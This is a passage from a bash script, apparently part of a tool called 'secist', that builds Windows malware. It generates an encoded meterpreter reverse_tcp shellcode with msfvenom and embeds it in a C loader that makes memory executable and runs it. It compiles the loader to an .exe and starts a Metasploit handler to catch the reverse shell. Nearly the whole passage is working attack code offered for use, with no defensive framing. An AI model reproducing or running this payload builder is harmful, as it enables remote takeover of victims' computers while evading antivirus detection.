  echo -e "       secist> Enter your IP address: \c"
  read ip
  echo -e "       secist> Enter your port: \c"
  read port
  echo -e "       secist> Enter the number of iterations(1-500): \c"
  read encode
  echo  $( msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=$ip  LPORT=$port -e x86/shikata_ga_nai -b '\x00' -i $encode -f c) | sed 's/unsigned char buf\[\] =//g' >> output/shellcode.txt
  Shellcode=$(cat output/shellcode.txt)
  echo  "
  # include <stdlib.h>
  # include <stdio.h>
  # include <string.h>

  # include <windows.h>


  int
  main(void)
  {
  	char *shellcode =

    $Shellcode


  	DWORD why_must_this_variable;
  	BOOL ret = VirtualProtect(shellcode, strlen(shellcode),
  		PAGE_EXECUTE_READWRITE, &why_must_this_variable);

  	if (!ret) {
  		printf(\"VirtualProtect\n\");
  		return EXIT_FAILURE;
  	}
  	((void(*)(void))shellcode)();

  	return 0;
  }

  " >> output/shellcode.cpp

  wine gcc -m32 -W -Wall -o output/shellcode.exe output/shellcode.cpp
  rm output/shellcode.txt output/shellcode.cpp
  echo -e "  +------------++-------------------------++-----------------------+"
  echo -e "  | Name       ||  Descript   	          || Your Input             "
  echo -e "  +------------++-------------------------++-----------------------+"
  echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
  echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
  echo -e "  | OUTPUTNAME ||  The Filename output    || output/shellcode.exe   "
  echo -e "  +------------++-------------------------++-----------------------+"
  echo "use exploit/multi/handler" >> resource/handler.rc
  echo "set PAYLOAD $payload" >> resource/handler.rc
  echo "set LHOST $ip" >>  resource/handler.rc
  echo "set LPORT $port" >>  resource/handler.rc
  echo "exploit " >>  resource/handler.rc
  msfconsole -r  resource/handler.rc
}
menu
